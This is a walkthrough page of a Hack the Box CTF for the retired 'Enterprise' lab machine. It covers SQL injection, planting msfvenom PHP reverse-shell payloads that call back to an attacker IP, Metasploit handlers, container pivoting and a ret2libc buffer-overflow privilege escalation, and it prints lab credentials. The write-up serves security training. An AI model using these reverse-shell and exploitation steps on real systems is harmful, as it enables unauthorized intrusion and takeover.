<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Enterprises Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-enterprises-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-07-17T07:35:02+00:00">July 17, 2018</time><time class="updated" datetime="2025-07-05T16:53:31+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Enterprise” which is available online for those who want to increase their skill in penetration testing and black box testing. <strong>Hack the Box</strong> presents Enterprise as a retired vulnerable lab for making online penetration practices according to your experience level; they offer a collection of vulnerable labs as challenges from beginners to expert level.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Expert</span></p>
<h5><span style="color: #000000;"><strong>Task:</strong> Find <strong>user.txt</strong> and <strong>root.txt</strong> file on victim’s machine.</span></h5>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.61</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.10.10.61</pre>
<p><span style="color: #000000;">From given below image, you can observe we found port 22, 80, 443 and 80 are open on target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Rpa3SQ1pu_E/W02TpajwisI/AAAAAAAAYMg/R1dIhpsMzY08De3Jzv189l2DzkxRrU8lACEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As port 80 is running http server we open the target machine’s ip address in our browser, and find a website that is running on wordpress.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-rJTCDYWgJm8/W02TvO-BXOI/AAAAAAAAYNE/YxgCUY-CC5wLW5hkuSRjtz84IzaiKXQQQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Since port 8080 is also running an http server, we open our browser and enter the target machine’s IP address, and we find a website that is not made on WordPress.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-U4SQnEX5G1Q/W02T2vGx39I/AAAAAAAAYNk/yvL0jdSNHdoWLpKq9s-LMIjuRh1DsW-qgCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">When we try to open the wordpress admin page but are redirected to domain called “enterprise.htb”. We enter the domain name in /etc/hosts file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-24qU_3pYzt8/W02UAiHSAOI/AAAAAAAAYOY/V0CyFaeD3L8AWXV12lApjNemNVuwpl6IgCEwYBhgL/s1600/4.png"/></span></p>
<h5><span style="color: #000000;">Now when we open wp-admin, we are able to get the login page.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qgaUos6pCXY/W02UBg5XbhI/AAAAAAAAYOo/ou34J_XdU20Ub2S2w_KNMyPaJLLWuFXhwCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We run dirb on port 80 to enumerate the directories and find a directory called /files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.61</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mHyMkaZ_uFM/W02UCITm-HI/AAAAAAAAYOs/qQv70CUsqBcs1tz3oxNB0iSpbqQIzzNwQCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now, we open the files/ directory, and find a zip file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--nvTsN4Rg2Y/W02UCVAb6MI/AAAAAAAAYOw/rWF3OzNbkYMrQjsy5xJgz6AEsD2kQEf7QCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We download the zip file in our system and unzip it. After unzipping it we find 3 php files.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BlSGANMVSVg/W02UCbxhIGI/AAAAAAAAYO0/3m7tO4MAo2k3O2bOYsqbH076_5pQTBa7gCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We take a look at the content of the files and it looks like the WordPress site might be using a plugin called lcars, and by the looks of the code, it is possible that the site is vulnerable to SQL-injection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-q-tyi1kRUL0/W02UDAilmaI/AAAAAAAAYO4/UYbA0XyGB28Kola3AbmKK-qzMd4MIQ6HQCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now when we open it we get a php error message, we now know that this plugin is vulnerable to SQL-injection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6rR3DfhAjEs/W02TpQGnhkI/AAAAAAAAYMc/e7eiz7vZy8830BpFK9iuXAOX4n1fz9TVgCEwYBhgL/s1600/10.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">We use sqlmap to dump the database and found a message with a few passwords. We also find that there is a joomla database we try to dump it and find a username <strong>geordi.la.forge.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bFV2DkRWlnQ/W02Tpqy4b4I/AAAAAAAAYMk/pLN86wowrJU_OmpIZnj5YAwMcJ0hrQ3iwCEwYBhgL/s1600/11.1.png"/></span></p>
<p><span style="color: #000000;">Now we use one of these passwords to login into wordpress. On the webpage we see that there are has been posts made by user william.riker. So we use credentials <strong>william.riker:u*Z14ru0p#ttj83zS6 </strong>to login into wordpress control panel.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Xmn5spjXQGE/W02Tq54xRsI/AAAAAAAAYMo/amD5NQxizTY7pALWaROcUZxzxi91arJywCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now we change the 404.php template with our payload to get reverse shell on the machine. First we are going to create our payload using msfvenom.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 –f raw</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-PhS6GZpLaIQ/W02Tsd7TRII/AAAAAAAAYMs/QfIhUAgRK0Ix4LYHTH21FMqBbpTUn9j9ACEwYBhgL/s1600/12.png"/></span></p>
<h5><span style="color: #000000;">Now we are going to setup our listener using metasploit.</span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 10.10.14.25
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-Jx4sibTL_KE/W02Ts51M4AI/AAAAAAAAYMw/ynMrUxDxRdYrwIzmj0YygWNn5qnAOM5igCEwYBhgL/s1600/13.png"/></strong></span></p>
<p><span style="color: #000000;">After replacing the 404.php code with our payload, we open the 404.php page in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-E8i7kSHpbX8/W02Ts1D-WwI/AAAAAAAAYM0/Bd6KoqlisHQQvRIacqljc8SG5sT43dR_QCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">As soon as we open it we get our reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NR7Tpu6mWZQ/W02Ttl7zz2I/AAAAAAAAYM4/Sr9Hg0kaIx4yv3j1MHeUxO1ThLMHbp26gCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">After getting our reverse shell we find that we are actually in a container app and we find the machine has 2 network card.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-G1bSPctCKbc/W02TuMrmxXI/AAAAAAAAYM8/8dNGs5aJQUEfEbuE4oHUkKuv-UH4SxMFwCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now we find all the ip’s in the subnet of the container.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-VVTfmQcDNJw/W02TuoOrT_I/AAAAAAAAYNA/yO6yBg2OjqwtWWBbqgxb6EErjrYvvaF-QCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Then we create another shell using msfvenom to upload it into the joomla site on port 8080.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tqDB2fN0lnw/W02TwpZRhVI/AAAAAAAAYNI/HrxiUlWyVuMkVSHRRqVvg2LGIlEY2iCRwCEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now we background our session and change the lport according to our payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; background
msf exploit(multi/handler) &gt; set lport 4455
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-A-A00W48HL4/W02Tz8V_ZOI/AAAAAAAAYNM/gxZIf8Rppa0Ly8FU56JtTNQzwfAD572nACEwYBhgL/s1600/24.png"/></strong></span></p>
<p><span style="color: #000000;">We are first going to login into the joomla site, using credentials, <strong>geordi.la.forge:</strong><strong>ZD3YxfnSjezg67JZ</strong> and upload our shell code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ga7kSHQpIIU/W02Tz9aGK6I/AAAAAAAAYNQ/7JZPeILlMFAXEbV8aMKC9iqPrBwNYD7GQCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">As soon as we open the page we get our reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sBbU9UvV7y0/W02T0BYuwvI/AAAAAAAAYNU/vAvfUl5LdHoi-zlB_ik2_o3S2KB8fqj9gCEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;">After getting into the joomla container, we find that we have common file called /var/www/html/files.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-2j17Q62hMlA/W02T00N5Z6I/AAAAAAAAYNY/DMyOAsTlZqQd5d60LL9totXFXD_dvLQ4gCEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">We create another php payload using msfvenom to upload this shell into /var/www/html/files directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw &gt; shell1.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VrhPM0jduAA/W02T1UcpcfI/AAAAAAAAYNc/EqAgMeg8IO8NdXqKpScRJfXufmqxJI2dACEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">We go to /var/www/html/files directory and upload the shell using meterpreter.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OFEF9SjPB-s/W02T1nopXkI/AAAAAAAAYNg/EM31kOygajEDIakz7bJyE-CR3W26nEmfQCEwYBhgL/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Now we background our current session and change the lport according to our new payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; background
msf exploit(multi/handler) &gt; set lport 5555
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tH8Hq8omhqg/W02T4-r3wvI/AAAAAAAAYNo/ScEMWYeWH2EC58Gm-66L-dSeE-Ts64InwCEwYBhgL/s1600/30.png"/></span></p>
<p><span style="color: #000000;">When we go to /files directory we find that our shell has been uploaded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8Sn1llrmAl0/W02T6Xvp5HI/AAAAAAAAYNs/avbMMC4qTigN7cjbuh8_XBNcD39lxdF7QCEwYBhgL/s1600/31.1.png"/></span></p>
<h5><span style="color: #000000;">As soon as we click on the payload we get our reverse shell.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v5RHULBNgqU/W02T7rzs8GI/AAAAAAAAYNw/zNJEgbQfaxc3PxJEJS35N5ThrdoS5zuIwCEwYBhgL/s1600/31.png"/></span></p>
<p><span style="color: #000000;">After getting the reverse shell on the main machine instead of container we try to find files with suid bit set.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -4000 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-mltDIewdQ2U/W02T9C8loxI/AAAAAAAAYN0/30wWslCMVIwdMplVTZqByJZGGZt6HQeCgCEwYBhgL/s1600/32.png"/></span></p>
<p><span style="color: #000000;">We find a file called lcars, we find that it has been running on port 32812.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2YOmR2UnI9E/W02T9f0jz0I/AAAAAAAAYN4/MZrBxcEahacnSmTysyRfWq6FdZs1QyYTACEwYBhgL/s1600/33.1.png"/></span></p>
<p><span style="color: #000000;">When we connect with it using netcat we find that it asks for access code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ucjz-sJ7xFI/W02T9Sc-zZI/AAAAAAAAYN8/aa8lScMjuEABAUVndj5B0PLM255P014pQCEwYBhgL/s1600/33.2.png"/></span></p>
<p><span style="color: #000000;">We run the file on the target machine using ltrace to find the access code for this binary.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9kco-LtOWPI/W02T-fDBTcI/AAAAAAAAYOE/Yl1jKWB7MUw2MsDnSepJvJPjIlTqzUXUACEwYBhgL/s1600/34.png"/></span></p>
<p><span style="color: #000000;">Here, we find that when we pass a it gets compared to a string called pircarda1. We use this to login into the binary.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v07rhkT6trY/W02T-zp38mI/AAAAAAAAYOI/I9w5yE1UjDEHm7ZN1TgRmLo8WmCnKeTMwCEwYBhgL/s1600/35.png"/></span></p>
<p><span style="color: #000000;">Now we are able to access the file using this binary now we try to find this program is vulnerable to buffer overflow. We open the file using gdb to read the assembly code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_fbxqzP1xf8/W02T_uVaXlI/AAAAAAAAYOM/UkzeJcT1tK8E8yR-rJLPedodQfa4-xmOQCEwYBhgL/s1600/36.png"/></span></p>
<p><span style="color: #000000;">Now create 500 byte long string using pattern_create.rb script to find the EIP offset.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pattern_create.rb -l 500</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-_FzbO4Zp1dg/W02T_68_KBI/AAAAAAAAYOQ/b1phq-h42eElj4ORHZbmdropcl740EiZACEwYBhgL/s1600/38.png"/></span></p>
<p><span style="color: #000000;">After searching all the options we find that option number 4 was vulnerable to buffer overflow.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fcuT3tcjqf4/W02UAH8cB-I/AAAAAAAAYOU/Of5GVLCujbI0jaBKDn-IfKmEc-m_2-i2ACEwYBhgL/s1600/39.png"/></span></p>
<p><span style="color: #000000;">We pass that into /usr/share/metasploit-framework/tools/pattern_offset.rb, we get an offset of 212. So we need to write 212 characters and then write the address of the instructions that we want to execute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pattern_offset -q 31684130 -l 500</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7K5kcsemFcE/W02UA7gApRI/AAAAAAAAYOc/UWfQMCiNEFwM975IACnfEJdYmM4aIeMXACEwYBhgL/s1600/40.png"/></span></p>
<p><span style="color: #000000;">Now when we try to insert shellcode into the buffer but we were unable to execute it because of DEP. It prevents code from being executed in the stack. Now we are going to do a ret2libc attack to execute a process already present in the process’ executable memory. We go into the target machine and find ASLR in enabled so we have to brute force the address. Now we find the address of system, exit and /bin/sh.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gdb /bin/lcars
(gdb) b main
(gdb) run
(gdb) p system
(gdb) find 0xf7e0bd10, +9999999, "/bin/sh"
(gdb) p exit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Fw5o9lukT9U/W02UBd03DaI/AAAAAAAAYOk/hqOHWNUsTqA74STbyfl_MslYwgjdKik-ACEwYBhgL/s1600/41.png"/></span></p>
<h5><span style="color: #000000;">We create an exploit which can be found <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/Sayantan5/enterprise.git">here</a></span>. </span></h5>
<p><span style="color: #000000;">As soon as we run the exploit we get our reverse shell as root user. We go to /root directory and find a file called “root.txt”. When we open it we find our 1<sup>st</sup> flag. We then go to /home directory inside we find another directory called jeanlucpicard/. Inside /home/jeanlucpicard we find a file called “user.txt”, we open it and find our final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OVDNF82IBQk/W02UBEgbGVI/AAAAAAAAYOg/9OUaw7SJtXQZUbLztcsCl6VwLpUpRbkzACEwYBhgL/s1600/42.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
